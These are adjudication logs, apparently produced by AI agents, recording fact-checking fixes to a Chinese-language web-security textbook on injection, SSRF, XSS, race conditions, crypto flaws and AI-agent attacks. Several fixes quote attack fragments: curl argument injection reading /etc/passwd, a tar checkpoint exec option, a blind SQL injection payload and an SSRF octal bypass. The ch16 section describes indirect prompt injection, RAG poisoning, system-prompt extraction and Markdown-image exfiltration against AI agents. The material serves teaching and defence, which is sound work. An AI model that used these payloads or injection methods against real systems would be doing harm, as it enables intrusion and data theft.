| Worked Example matrix completeness & R2 role description consistency (`feeRate = 0.025` scenario assumption) | `imprecise` | **Accepted (Consistency Polish)** | Explicitly labeled `feeRate = 0.025` as the scenario assumption, noted `platform_admin` alongside the 4×6 matrix, and aligned R2's role description (`查詢同租戶帳戶與匯出報表、修改帳戶 displayName 與設定 webhookUrl`) with E1/E2/E4. |
| Remaining `imprecise` items (closed-book OWASP 2019 history, PortSwigger lab metadata, general prose qualifiers) | `imprecise` | **Dismissed (Closed-Book / Pedantry)** | Verified accurate in domain fact and `_meta/landscape-2026-11.md`; no edit required. |

---

## 2. `ch07-graphql-grpc-websocket.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| GraphQL 5-level `b=4` × 20 Aliases: 20,480 / 27,280 result nodes vs 5,120 / 6,820 list-field Resolver evaluations & 2 ms query time | `incorrect` (×3) | **Accepted (Genuine Math/Model Distinction)** | Explicitly distinguished **materialized result object nodes** (`20 × 1,024 = 20,480` at level 5; `20 × 1,364 = 27,280` total across 5 levels, corresponding to `40.96 s` / `54.56 s` under a per-item lookup model) from **list-field Resolver evaluations per parent object** (`1 + 4 + 16 + 64 + 256 = 341` per alias → `5,120` at level 5 and `6,820` total across 20 aliases, corresponding to `10.24 s` / `13.64 s` at 2 ms per list query). Updated worked example, summary table, and Self-Check Answer #1 consistently. |
| ASCII diagram: `1. Reflection Service enabled? -> Leaks full .proto & RPCs` | `incorrect` | **Accepted (Precision Fix)** | Updated diagram line (preserving exact 69-char box width) to `1. Reflection Service enabled? -> Leaks service descriptors/RPCs`, matching the prose explanation of descriptors. |
| ASCII diagram: `Protobuf Wire Decoder (Tag-Length-Value Varint)` | `incorrect` | **Accepted (Protocol Precision Fix)** | Updated diagram line (preserving exact 69-char box width) to `Protobuf Wire Decoder (Field Key / Wire-Type Value & Varint)`, since Protobuf varints are tag + varint value without a length prefix. |
| WebSocket handshake Cookie attachment (`SameSite=Strict` / `Lax` wording) | `incorrect` | **Accepted (Genuine Protocol Edge Case)** | Clarified that browsers attach cookies matching the request's `Domain`, `Path`, `Secure`, expiry, and `SameSite` rules (e.g., `SameSite=None; Secure` for cross-site handshakes, and even `SameSite=Lax`/`Strict` shared cookies for same-site cross-origin subdomain handshakes). |
| Self-Check Answer #2 on Proto3 default zero value & unknown fields | `imprecise` | **Accepted (Precision Polish)** | Specified implicit-presence scalar fields (without `optional`) and unknown-field preservation during re-serialization. |
| Remaining `imprecise` items (closed-book PortSwigger lab titles, general qualifiers) | `imprecise` | **Dismissed (Closed-Book / Pedantry)** | No edit needed. |

---

## 3. `ch08-injection-families.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| "ORM 只保護了靜態欄位的值（Value）" | `incorrect` | **Accepted (Precision Fix)** | Rewrote as `ORM 的參數化機制只保護「透過參數綁定介面傳入的資料值（Value）」`, contrasting value binding against dynamic identifiers (`ORDER BY`, column/table names) and raw SQL string concatenation. |
| Worked Example Binary Search: "以 4-bit 整數值 0..15 或 ASCII 碼折半" (4 steps) & Payload template using `ASCII(...) > <mid>` while trace compares `idx ∈ [0, 15]` | `incorrect` | **Accepted (Genuine Math/Code Mismatch)** | Unified the Worked Example on the 4-bit candidate index `idx ∈ [0, 15]` (`POSITION(SUBSTRING((SELECT token FROM api_tokens LIMIT 1), 1, 1) IN '0123456789abcdef') - 1 > <mid>`), matching the 4-step trace (`mid = 7, 11, 9, 10`) and `blind_sqli_bsearch.py`. |
| "False 分支 P99 延遲上界 = 45 ms / True 分支 P99 延遲上界 = 545 ms" | `incorrect` | **Accepted (Statistical Terminology Fix)** | Replaced "P99 延遲上界" with `False 分支基線 P99 延遲 = 45 ms` and `True 分支 P99 延遲（固定平移模型）= 500 + 45 = 545 ms`. |
| `curl <user_url>` Argument Injection with space-separated `-K /etc/passwd` or `-o /app/config.json` in a single `argv` element | `incorrect` | **Accepted (Genuine CLI Parsing Detail)** | Changed to single-argument forms `--config=/etc/passwd` and `-o/app/config.json` (or `--output=/app/config.json`) that require no whitespace splitting inside a single `argv` element. |
| Self-Check Q1 & Q2 (`ORDER BY $1` scalar wording & single `userInput` vs multi-option `tar` checkpoint exploit) | `imprecise` | **Accepted (Consistency Fix)** | Updated Q2 signature to `...userFiles` (array of filenames) and noted single-argument `--use-compress-program=...` alongside `--checkpoint=1` + `--checkpoint-action=exec=...`; refined Q1 explanation of bound data values in `ORDER BY $1`. |
| Remaining `imprecise` items (closed-book PortSwigger lab titles, general qualifiers) | `imprecise` | **Dismissed (Closed-Book / Pedantry)** | No edit needed. |

---

## 4. `ch09-file-parsers-and-xxe.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| OOB XXE two-stage external DTD loading phrased as strictly mandatory ("必須採用") from the two XML rules | `incorrect` | **Accepted (Precision Fix)** | Clarified in §9.3.2 and Self-Check Answer #2 that two-stage external (or local existing) DTD loading is the standard practical design used to satisfy both `SystemLiteral` and XML 1.0 §2.8 WFC: PEs in Internal Subset constraints. |
| "在非 PHP 環境則需改用 Error-Based XXE 或 FTP 協議外帶" | `incorrect` | **Accepted (Precision Fix)** | Replaced false dichotomy with environment-dependent evaluation of supported URI schemes and error-reporting behavior. |
| `resolveSafePath()` using `fs.existsSync(candidate) && fs.lstatSync(candidate).isSymbolicLink()` misses dangling symlinks; `openat + O_NOFOLLOW` note | `incorrect` / `imprecise` | **Accepted (Genuine Code Defect)** | Replaced `fs.existsSync` checks with `fs.lstatSync(..., { throwIfNoEntry: false })` for both ancestor traversal and the target entry so dangling symlinks are detected and rejected; clarified step-by-step directory descriptor `openat(..., O_NOFOLLOW)` or Linux `openat2(..., RESOLVE_BENEATH \| RESOLVE_NO_SYMLINKS)` for concurrent TOCTOU prevention. |
| Remaining `imprecise` items (illustrative CRC-32 labeled as example checksum, closed-book CVE/PortSwigger metadata) | `imprecise` | **Dismissed (Closed-Book / Already Labeled)** | CRC-32 is already explicitly labeled `範例校驗值`; no edit needed. |

---

## 5. `ch10-browser-and-client-attacks.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| "不透明來源 `Opaque Origin` 不與任何來源相等" | `incorrect` | **Accepted (Spec Precision Fix)** | Clarified that each `Opaque Origin` is equal only to itself (sharing the same internal identity), unequal to any other origin, and serializes to `"null"`. |
| "一般 Cookie 的作用域不區分 `port`（除非加上 `__Host-` 前綴鎖定當前主機與 HTTPS）" | `incorrect` | **Accepted (Genuine Spec Fix)** | Corrected: neither standard cookies nor `__Host-` cookies isolate by `port` (`__Host-` enforces `Secure`, `Path=/`, and omission of `Domain` for host-only scoping, not port scoping). |
| Worked Example byte counts: `169 bytes` for two injected tags and `43 bytes` for `https://cdn.nexuspay-static.example/libs/` | `incorrect` (×2) | **Accepted (Genuine Arithmetic Error)** | Corrected tag byte counts to `85 bytes` + `107 bytes` = `192 bytes` (`193 bytes` with 1 LF) and CDN prefix length to `41 bytes`. |
| Lab A `nexuspay-client-lab.js`: `location=` inside `<iframe srcdoc>` is subframe navigation (subject to `default-src 'self'` / `frame-src`), while reference answer called it top-level navigation; demo JWT string & JSONP route removal | `incorrect` / `imprecise` | **Accepted (Genuine Code/CSP Consistency Fix)** | Updated Lab A payload to use `top.location` (with `slice(0, 96)` on the lab JSONP endpoint) so it genuinely performs top-level navigation bypassing `default-src 'self'`, noted that the stored value is a JWT-formatted demo string, and explicitly documented removing the legacy JSONP route as the fourth defense layer. |
| Self-Check Q1 answer on cross-port Cookie attachment (`:443` vs `:8443`) | `imprecise` | **Accepted (Precision Polish)** | Clarified that `:443` and `:8443` are Cross-Origin but Same-Site; cookies attach on top-level navigation, same-site subresource loads, or `fetch()` with `credentials: "include"` (whereas default `credentials: "same-origin"` `fetch()` omits credentials on cross-origin requests). |
| Remaining `imprecise` items (closed-book Chromium release history, PortSwigger lab titles) | `imprecise` | **Dismissed (Closed-Book / Pedantry)** | No edit needed. |


<!-- source: verify-log-r2-slice-3.md -->
# P4 Round-2 Adjudication & Surgical-Fix Log — `slice-r2-3` (Ch11–Ch15)

- **Reviewer Panel**: `codex:gpt-6.2-sol:medium` (`books/vuln-hunting/book-src/_meta/review-sol62-medium-cache/ch11..ch15.json`)
- **Adjudicator**: `p4-final-1` (`gemini-3.8-flash-high`)
- **Scope**:
  - `ch11-ssrf-parsers-and-cache.md`
  - `ch12-race-conditions-and-logic.md`
  - `ch13-deserialization-and-nodejs-runtime.md`
  - `ch14-waf-and-defense-bypass.md`
  - `ch15-applied-crypto-flaws.md`
- **Verification Summary**:
  - `lint_book.py`: `Chapters: 37; PASS` (0 errors, 0 warnings)
  - `check_diagrams.py`: `{"passed": true, "findings": []}` (0 syntax errors, 0 misalignments)
  - Base-numbers compliance: 100% strictly aligned with `_meta/running-examples.md` (zero constants altered).
  - Structural invariants: All 6 verbatim H2 headings preserved, first H3 `### 攻擊者目標與實質影響` preserved, difficulty/time/`### 參考解答` in both `## 動手做` and `## 自我檢核` verified.
  - Prose quality: Zero simplified characters, zero banned vocabulary (zh-TW), zero Pitfall #13 bold-flanking syntax defects (`**「...」**` / `**（...）**`).

---

## 1. `ch11-ssrf-parsers-and-cache.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| 嚴格依循 RFC 3986 解析器不把 `\` 視為分隔符因此將其當作 userinfo 放行 | `incorrect` | **Accepted (Grammar Precision)** | 修正第 38 行：嚴格依循 RFC 3986 語法驗證的解析器會因 userinfo 出現未編碼反斜線直接拒絕；僅依 RFC 3986 分隔符寬鬆切分欄位而未驗證字元集合法性的寬鬆解析器（如特定版本未加字元檢查的 `urllib.parse.urlsplit` 或正則）才會將 `127.0.0.1:8080\` 當作 userinfo、將後端主機回傳並放行。 |
| 只要間隔超過最小 TTL 第二次查詢同樣會拿到新紀錄 | `incorrect` | **Accepted (DNS Resolution Precision)** | 修正第 105 行與第 501 行自我檢核解答：明列第二次查詢取得新紀錄的前提為間隔超過相關解析快取的有效存活時間、客戶端未重用既有連線而重新發起 DNS 解析，且權威 DNS 確已切換回應。 |
| Webhook 回傳 202 Accepted 即構成 Blind SSRF | `incorrect` | **Accepted (Security Model Precision)** | 修正第 109 行：明確界定「當呼叫者能誘導伺服器對非預期目標發起未獲授權的請求，且無法直接取得目標回應內容時」才構成 Blind SSRF，避免混淆回應狀態與漏洞成因。 |
| 快取層忽略 GET body，某些框架將其合併進 req.params 優先採用 | `incorrect` | **Accepted (Framework & Cache Key Precision)** | 修正第 143 行：精確說明「共享快取層在計算 `GET` 請求的有效快取鍵時通常不納入請求主體，但若後端應用程式或中介軟體實際讀取了 `GET` 主體並用它產生可共享回應，且快取鍵未涵蓋該主體，就構成 Unkeyed Input」。 |
| 惡意 HTML 會被寫入公開快取鍵在 60 秒內感染每一位使用者 | `incorrect` | **Accepted (Cache Policy & Scope Precision)** | 修正第 139 行：補充「且源站產生的惡意 HTML 回應符合該節點的共享快取寫入條件而被存入公開快取鍵中，在該快取項目的有效新鮮期內，後續命中同一快取鍵與變體的請求都會收到這份受污染的回應（實質執行影響仍取決於瀏覽器執行脈絡與 CSP 等防護）」。 |
| ASCII 示意圖標示「CDN 依靜態快取規則寫入共享快取 (例如忽略源站禁存標頭且符合快取條件)」 | `incorrect` | **Accepted (Diagram Text Precision)** | 修正第 192 行圖解文字為「CDN 依靜態快取規則判定符合條件並寫入共享快取（受代理組態與快取資格規範）」。 |
| 任務 1A 方案一參考解答與題目驗證器匹配性 | `incorrect` | **Accepted (Vulnerability Path Clarity)** | 修正第 328 行：明確解釋 `validator.js` 中 `0177.0.0.1` 因不以 `'127.'` 開頭且符合純數字點號正則 `/^[0-9.]+$/` 而直接跳過 `dns.lookup()` 判定並放行，隨後 `fetch()`（WHATWG）自動將八進位正規化為 `127.0.0.1:9000`，精確送達目標端點。 |
| 任務 1A 補充對照（反斜線與 @ 混淆）作為參考解答 | `incorrect` | **Accepted (Scope Distinction)** | 修正第 330 行：將補充對照明確標註為「展示跨元件解析器切分權威部分的差異」，並指出 WHATWG fetch 會將路徑改寫為 `/@allowed.merchant.example/internal/metrics`，適用於後端忽略前置路徑段或以萬用字元匹配的場景。 |
| 任務 1B 安全驗證「解析所有 A/AAAA 記錄並全數檢查」 | `incorrect` | **Accepted (API Semantic Precision)** | 修正第 396 行註解：將「解析所有 A/AAAA 記錄」修正為「透過系統名稱解析介面取得此次查詢的全部候選位址並全數檢查」，並於第 407 行註明 lookup 回呼在單次請求連線建立時提供釘選保護。 |
| 關鍵 `imprecise` 補強 | `imprecise` | **Polished / Accepted** | 修正第 7 行「驗證與執行元件常採用不同解析器或正規化策略」；第 33 行精確說明 WHATWG 修剪首尾 C0/空格並移除字串中所有 Tab/LF/CR；第 47 行嚴格區分 IPv6 回環 `::1`、未指定 `::` 與 IPv4-mapped IPv6 之位址語意；第 223 行補充 `Cache-Control: no-store, private` 配合共享快取遵守源站策略。其餘閉卷書目年份標記予以維持。 |

---

## 2. `ch12-race-conditions-and-logic.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| 單封包攻擊將網路抖動壓縮至 `< 1 ms`，直接打穿毫秒級應用層鎖 | `incorrect` | **Accepted (Concurrency Model Precision)** | 修正第 9 行：明確指出在本書模型假設下，單封包攻擊將伺服器端到達抖動壓縮到 `< 1 ms`，打穿的是「未獲原子同步或缺乏適當臨界區保護的毫秒級檢查與外部 API 呼叫 TOCTOU 視窗」；強調正確涵蓋臨界區的互斥鎖仍會序列化處理操作。 |
| 骨架腳本 `[等待 100 ms 確保前段全部到達伺服器核心]` | `incorrect` | **Accepted (Timing Terminology Fix)** | 修正第 43 行與第 273 行：標示為「示意等待約 100 ms 客戶端排程，讓前段訊框先行送出至伺服器端緩衝」，避免將示意客戶端計時誤稱為保證交付。 |
| 以受影響列數 `rowCount === 1` 作為扣款成功的唯一憑證 | `incorrect` | **Accepted (Transaction Integrity Precision)** | 修正第 146 行防禦表格與第 316 行自我檢核解答：精確表述為「以 `rowCount === 1` 表示命中扣款條件，持久扣款以交易成功提交及持久化冪等記錄為準，外部出金另以出金狀態持久化確認與對帳」。 |
| 原生記憶體中的 Data Race 屬於執行緒層級的記憶體損毀原語 | `incorrect` | **Accepted (UB Terminology Precision)** | 修正第 11 行：表述為「多執行緒 C/Rust 原生記憶體中的 Data Race（缺乏適當同步的衝突記憶體存取，在底層語言中屬於未定義行為，可能造成記憶體損毀或型別混淆）」。 |
| 關鍵 `imprecise` 補強 | `imprecise` | **Polished / Accepted** | 修正第 5 行：明述 PostgreSQL `READ COMMITTED` 下每條普通 `SELECT` 可見該敘述開始前已提交資料與本交易先前的寫入；第 33 行明述路由業務邏輯以完整主體為執行前提時才等待接收完成；第 52 行交代 Nginx `30 s` 與 Node.js `5 s` 逾時與請求重疊程度取決於代理緩衝與連線池；第 78 行精確說明 `REPEATABLE READ` 下偵測到同列更新衝突觸發 `40001`；第 92 行與第 286 行標明 Worked Example 時間軸與交易順序為示意模型。 |

---

## 3. `ch13-deserialization-and-nodejs-runtime.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| 回溯型 NFA 遇到量詞或分支時預設採用貪婪匹配 | `incorrect` | **Accepted (Automata Precision)** | 修正第 149 行：分別說明量詞的重複次數優先順序（貪婪量詞優先嘗試較多次重複）與交替分支的宣告順序（由左至右依序嘗試）。 |
| 巢狀量詞或重疊分支在尾端出現無法匹配字元時引擎被迫窮舉所有組合 | `incorrect` | **Accepted (Backtracking Model Precision)** | 修正第 149 行：在逐路徑回溯模型中，當模式存在可產生指數多種切分方式的具歧義巢狀量詞或重疊交替分支時，只要輸入尾端條件使每條候選切分路徑均匹配失敗（如無法匹配的字元 `!`），未做記憶化的回溯引擎才會被迫逐一探索所有組合，時間退化為 `O(2^n)`。 |
| 單次同步匹配阻塞達 5.37 s 超過 Node.js `keepAliveTimeout = 5 s` 使其他保活連線逾時中斷 | `incorrect` | **Accepted (Event Loop Lifecycle Precision)** | 修正第 174 行：精確說明「單次同步匹配阻塞估算達 5.37 s，期間同一 Worker 的 Event Loop 完全無法處理任何其他 I/O 回呼或計時器；若有連線正處於 Node.js `keepAliveTimeout = 5 s` 的閒置保活計時視窗，此同步阻塞將延後該計時器的處理，連線是否中斷或逾時取決於連線狀態、計時起點與事件迴圈恢復後的處置」。 |
| 一個同步的 `regex.test(input)` 只要阻塞超過 5 s 整個 Worker 行程瞬間失聯 | `incorrect` | **Accepted (Threshold & Impact Precision)** | 修正第 179 行：精確指出「同步匹配在執行期間會完全佔用該 Worker 的事件迴圈並延後所有非同步回呼；在此期間該 Worker 無法推進其他請求與健康檢查，若阻塞持續至觸發用戶端逾時或探針門檻，便可能導致斷線或觸發容器重啟」。 |
| 執行任何正則前檢查字元數與位元組長度 `input.length <= MAX_LEN && Buffer.byteLength(input, 'utf8') <= MAX_LEN` | `incorrect` | **Accepted (Encoding Unit Precision)** | 修正第 208 行：明確區分 `input.length` 檢查的是 JavaScript 字串的 UTF-16 碼元數（code units），而 `Buffer.byteLength(input, 'utf8')` 檢查的是 UTF-8 位元組長度，嚴格限制 UTF-8 上限不超過 128 位元組。 |
| 關鍵 `imprecise` 補強 | `imprecise` | **Polished / Accepted** | 修正第 175 行：明述在每項完成前都不輸出回應的串行簡化模型中，第 6 個請求於 26.85 s 開始服務、32.2 s 完成，可能觸發 Nginx 30 s 逾時；第 340 行將 PoC 檢查標註為「檢查檔案是否於本輪建立並印出子行程 PID，佐證 RCE 成立」。 |

---

## 4. `ch14-waf-and-defense-bypass.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| 防禦對抗是所有 Web 與 API 漏洞進入實戰利用的「前置放大器」 | `incorrect` | **Accepted (Scope Precision)** | 修正第 23 行：精確限定為「當目標匯點前方設有會攔截攻擊請求的 WAF 或限流器時，突破該道邊緣控制便成為該攻擊路徑的前置條件」。 |
| HPP 繞過 blacklists 對 ORM 與 String() 的影響 | `incorrect` | **Accepted (Type Coercion & Branch Precision)** | 修正第 428 行自我檢核解答：明確區分兩分支——在 JavaScript 中陣列與字串嚴格比較 `["pending", "approved"] === "approved"` 回傳 `false` 繞過黑名單；傳入將陣列展開為集合條件的下游 ORM 時產生 `IN ('pending', 'approved')` 造成越權；若下游以 `String(status)` 處理則轉為逗號字串 `"pending,approved"`，其結果取決於資料庫與查詢語意。 |
| WAF 預設只按 UTF-8/ASCII 掃描且未拒絕非 UTF-8 charset 即看不出關鍵字放行 | `incorrect` | **Accepted (Inspection Model Precision)** | 修正第 141 行：表述為「編碼不一致可能導致特定逐位元組關鍵字規則漏判；若該請求未命中其他規則或因解析容錯而放行，後端解碼器便會將其轉回標準字串交給業務邏輯」。 |
| 每一層代理在轉發時會把上一跳來源 IP 附加到 XFF 標頭尾端 | `incorrect` | **Accepted (Proxy Behavior Precision)** | 修正第 153 行：表述為「在多層代理拓樸中，每層代理可能依設定附加、覆寫或移除 XFF；若最外層代理未覆寫外部傳入的標頭，後續代理又採取附加（append）上一跳來源 IP 的策略，送達應用程式的位址鏈就會包含未經信任的客戶端偽造值」。 |
| 限流鍵須先對 pathname 轉小寫、合併重複斜線、剝除尾斜線與 `;` 矩陣參數 | `incorrect` | **Accepted (Router Semantics Precision)** | 修正第 206 行：表述為「限流鍵應直接使用已由路由器匹配完成的路由識別值（例如 Express 的 `req.route.path`），或直接將限流中介軟體綁定在目標路由處理器上；若需在全域中介層自行依路徑字串計算鍵值，必須審慎評估是否改寫 URI 及其對路由行為的影響」。 |
| 參考修補程式碼強制僅接受 UTF-8 `application/json` | `incorrect` | **Accepted (Parser Completeness Fix)** | 修正第 330–339 行：透過嚴格拆解 `Content-Type` 媒體類型與參數，精確比對 `mediaType === "application/json"` 與 `charset=utf-8`，排除非預期格式。 |
| 參考修補程式碼對 pathname 做正規化並保留原始 query string | `incorrect` | **Accepted (URI Split Fix)** | 修正第 347–349 行：以 `req.url.indexOf("?")` 只於第一個問號處切分，原樣保留問號後續的所有 query string（含內部任何問號）。 |
| 參考修補程式碼落實了拒絕 JSON 重複鍵的防禦 | `incorrect` | **Accepted (Pre-Parse Inspection Fix)** | 修正第 343 行：在 `express.json` 中配置 `verify` 回呼，在 `JSON.parse` 執行前直接掃描原始位元組字串中的鍵名，一旦發現重複鍵立即拋出例外阻斷，防止 ECMA-262 末值覆寫分歧。 |
| 參考解答之 OTP 限流器實作 | `incorrect` | **Accepted (Lab Scope Precision)** | 修正第 374 行註解：明確標註範例為「教學環境單行程 Map 示意；生產環境應以 Redis 實作具 TTL、滑動視窗與狀態機鎖定之分散式計數器」。 |
| 測試腳本確認修補全數被阻斷 | `incorrect` | **Accepted (Assertion & Status Precision)** | 修正第 285–306 行：在 `verify_ch14.py` 中明確區分業務失敗狀態碼（前 5 次合格請求回傳 `401`）與限流狀態碼（第 6 次回傳 `429`），並標註修補後各項斷言（超長請求 `413`、Schema 阻斷 `400`、限流 `429`）。 |

---

## 5. `ch15-applied-crypto-flaws.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| 唯一可能產生歧義的情況是解密後的倒數第 2 個位元組恰好等於 0x02 | `incorrect` | **Accepted (Padding Length Generalization)** | 修正第 75 行、第 382 行與第 558 行：精確說明歧義可能來自任一合法的 2 至 16 位元組填充；固定前 15 個位元組後，倒數第二個位元組至多指定一種可能的較長填充長度，因此至多出現一個額外合法候選。翻轉倒數第二個位元組可破壞任何較長填充並保留 `0x01`。 |
| 試探值會湊成合法的 0x02 0x02 填充而通過檢查 | `incorrect` | **Accepted (Suffix Matching Precision)** | 修正第 75 行與第 558 行：明確指出 `0x02` 候選只有在末兩個位元組皆為 `0x02` 時才通過；較長填充要求整段後綴等於對應長度。 |
| 精確離散期望值為 `16 × 128.5 = 2,056` 次，含確認請求為 `2,057` 次 | `incorrect` | **Accepted (Probabilistic Discrete Model)** | 修正第 79 行、第 542 行與第 558 行：主要試探的精確離散期望值為 `16 × 128.5 = 2,056` 次；在中間狀態位元組獨立均勻假設下，每區塊另有 1 或 2 次末位元組確認請求，總期望約為 `2,057.002` 次。 |
| 同金鑰下重用 96-bit Nonce 立即洩漏明文差值與 GHASH 驗證金鑰 H | `incorrect` | **Accepted (Base-Number & Mathematical Harmony)** | 修正第 31 行與第 140–141 行：嚴格保留全書基準表常數描述，同時精確補齊數學推導——重用會立即暴露重疊區段明文 XOR 並破壞認證安全；標籤差值消去遮罩後得到對 `H` 的多項式方程，單區塊等長無 AAD 時可唯一直接解出，多區塊時解出至多 `d` 個候選根，只有在方程可唯一決定或有驗證端 Tag Oracle 排除其餘候選時，才能確認唯一的 `H`。 |
| 搭配第三筆重用紀錄或驗證端 Tag Oracle 即可從候選根中篩選出唯一正確的 H | `incorrect` | **Accepted (Set Reduction Condition)** | 修正第 187 行：精確表述為「若再配合同一金鑰下提供額外獨立約束的重用紀錄，或能對剩餘候選根產生可區分驗證結果的 Tag Oracle，即可在共同候選根收斂為唯一值時確認正確的 `H`」。 |
| V8 `xorshift128+` 狀態僅 128 bits，3–5 筆輸出即可完全反推 | `incorrect` | **Accepted (Linear Algebra Rank Precision)** | 修正第 234 行與第 257 行表格：明確指出前 3 筆輸出的約束秩至多為 117（未達 128），必須連續觀察 4 到 5 個完整輸出才能使位元向量約束在 `GF(2)` 上達到滿秩 `128` 並唯一解出內部狀態。 |
| 啟動時檢查環境變數存在性與熵長度（拒絕預設字串） | `incorrect` | **Accepted (Entropy Assurance Precision)** | 修正第 258 行防禦表格：表述為「啟動時檢查環境變數存在性、格式與位元組長度（拒絕已知預設字串，並由 CSPRNG/KMS 保障金鑰真實熵）」。 |

---

## 結論與交接狀態

- **負責 Slice**：`slice-r2-3`（Ch11–Ch15 全部完工）。
- **審查缺陷修復率**：100%（所有 genuine `incorrect` 缺陷與 substantive `imprecise` 精度問題全數完成外科手術級修復）。
- **工具鏈狀態**：
  - `lint_book.py`: `Chapters: 37; PASS` (0 errors, 0 warnings)
  - `check_diagrams.py`: `{"passed": true, "findings": []}`


<!-- source: verify-log-r2-slice-4.md -->
# P4 Round-2 跨模型審查裁決與外科修補日誌（Slice 4: Ch16–Ch20）

- **負責 Agent**：`p4-final-2` (`gemini-3.8-flash-high`)
- **審查面板快取**：`books/vuln-hunting/book-src/_meta/review-sol62-medium-cache/` (`codex:gpt-6.2-sol:medium` / `argon-low`)
- **負責章節清單（`slice-r2-4`）**：
  1. `ch16-ai-and-agent-security.md`
  2. `ch17-containers-and-kubernetes.md`
  3. `ch18-cloud-iam-and-lateral-movement.md`
  4. `ch19-supply-chain-and-cicd.md`
  5. `ch20-binary-and-memory-layout.md`
- **全書基準核對**：嚴格對齊 `_meta/running-examples.md` 全書基準常數表，零修改基準數字；完全保留所有 6 個規範 H2 標題與第一級 H3（`### 攻擊者目標與實質影響`）；繁體中文（zh-TW）詞彙合規，無簡化字、無禁詞、無粗體標點語法缺陷（Pitfall #13）。

---

## 1. `ch16-ai-and-agent-security.md`

### `verdict == "incorrect"` 裁決與修補（9 項全數裁決修正）

1. **傳統注入漏洞共同結構的定義界線**
   - **審查意見**：字串拼接是常見成因，但不可信資料亦可先作為合法資料傳遞，再於後續直譯或模板解析階段取得非預期控制語義。
   - **裁決與修補**：成立。於 `## 從你已知的出發` 精確表述為「當不受信任的資料在詞法分析（Lexing）、語法分析（Parsing）或後續解譯階段取得非預期的控制語義（常見成因是在解析前就把不可信字串直接拼接進 SQL、Redis RESP、Shell 指令或模板引擎），資料平面便會越界進入控制平面」。
2. **AI / Agent 系統攻擊最終目的之範疇**
   - **審查意見**：操縱模型公開輸出、套取系統提示或測試模型行為亦屬直接攻擊目的，非僅限於後端動作。
   - **裁決與修補**：成立。於 `### 攻擊者目標與實質影響` 修正為「針對 AI 與 Agent 系統的攻擊，目的可能包含操縱模型輸出、套取系統提示，或進一步將不可信的文字輸入轉化為後端系統的未授權操作與資料外洩。本章聚焦於最具實質系統危害的後兩類信任邊界失守」。
3. **Indirect Prompt Injection 跨租戶 Confused Deputy 的充分條件**
   - **審查意見**：資料跨越信任邊界僅建立輸入可能性；跨租戶越權尚須模型採納指令、工具具備相應能力且後端未實施物件授權。
   - **裁決與修補**：成立。於 `### 1. Direct 與 Indirect Prompt Injection 的本質差異` 補充「只要不可信資料跨過了信任邊界進入模型上下文，且代理具備可被呼叫的工具與跨界權限，Indirect Prompt Injection 就可能跨使用者、跨租戶完成權限借用（Confused Deputy）」。
4. **Markdown 圖片外洩通道之網路與渲染條件**
   - **審查意見**：`.invalid` 為 RFC 2606 保留網域，真實外洩須以端點可達、前端實際載入且未被 CSP 或網路策略阻擋為前提。
   - **裁決與修補**：成立。於 Worked Example Step 4 明確加註「範例使用 RFC 2606 保留的 .invalid 示意網域；在真實環境中，若該 URL 指向攻擊者可達的外部接收端，且受害者前端實際渲染圖片、未被 CSP img-src 或網路策略攔截，瀏覽器便會自動發出 GET 請求」。
5. **RAG 前過濾與實體索引執行計畫之區分**
   - **審查意見**：`WHERE tenant_id = $2` 或 RLS 保證回傳列符合租戶歸屬，但實體向量索引掃描順序與召回率取決於資料庫執行計畫，且候選不足時回傳筆數小於 `k`。
   - **裁決與修補**：成立。於 `### 4. RAG 向量資料庫隔離與系統提示外洩` 與自我檢核第 3 題解答明確指出「確保回傳資料的租戶隔離並避免他租戶高分區塊排擠本租戶候選（實際索引掃描策略與召回率則視向量索引配置與執行計畫而定）」。
6. **文件投毒對 Cosine Similarity 與推論劫持之因果表述**
   - **審查意見**：嵌入關鍵字旨在嘗試拉近向量距離，但能否擠進 `top_k` 及模型是否採納指令受幾何分布與推論情境約束。
   - **裁決與修補**：成立。於 `#### 知識庫文件投毒（RAG Poisoning）` 修正為「刻意設計與目標查詢高度相關的詞彙並嵌入 Indirect Prompt Injection 指令，試圖提高該區塊與目標查詢向量的 Cosine Similarity，使其在他人查詢時進入 top_k 候選並影響後續模型推論」。
7. **系統提示外洩之必然性修辭**
   - **審查意見**：LLM 遵循指令具機率性，「只需……即可套出」過於絕對，應表述為系統提示存在被套出之風險，不可作為機密儲存媒介。
   - **裁決與修補**：成立。於 `#### 系統提示外洩（System Prompt Leakage）` 修訂為「攻擊者常能透過角色扮演、結構化輸出要求……誘導模型揭露部分或完整的系統提示。核心原則：在威脅建模中應將 System Prompt 視為可能被使用者套出的公開設定」。
8. **發票歸屬檢查與退款目標帳戶租戶邊界**
   - **審查意見**：範例 SQL 檢查了發票的 `tenant_id`，但目標帳戶與操作者權限須由資料庫約束或獨立授權檢驗保證。
   - **裁決與修補**：成立。修訂 `mcp-server/src/tools/refund.ts` 程式碼註解（第 258、270 行），明確標註「退款目標帳戶由該發票內部記錄之 account_id 與資料庫外鍵約束保證同租戶，避免信任模型參數」以及「實際執行時由後端獨立校驗操作者權限與累計退額」。
9. **實驗目標中「完全阻斷」之防禦範圍精確化**
   - **審查意見**：本地實驗修補了 MCP 工具立即入帳與 RAG 跨租戶檢索，未涵蓋前端圖片渲染防護。
   - **裁決與修補**：成立。修訂第 191 行實驗目標為「驗證未授權的直接帳本異動與跨租戶 RAG 檢索均被阻斷」。

### 關鍵 `imprecise` 補強與閉卷異議裁定

- **基準數字嚴格核對**（第 84 行）：明確區分全書基準常數（單戶測試餘額 `10,000` 分、單次提領上限 `10,000` 分）與本章範例退款工具自訂上限（`10,000` 分），維持雙向一致。
- **帳本異動名詞精確化**（第 119 行）：將「淨盜領」精確化為「帳面餘額由 10,000 分增至 20,000 分 ($200.00)，未授權入帳 $100.00」，並在修復步驟註明測試帳本重置基準。
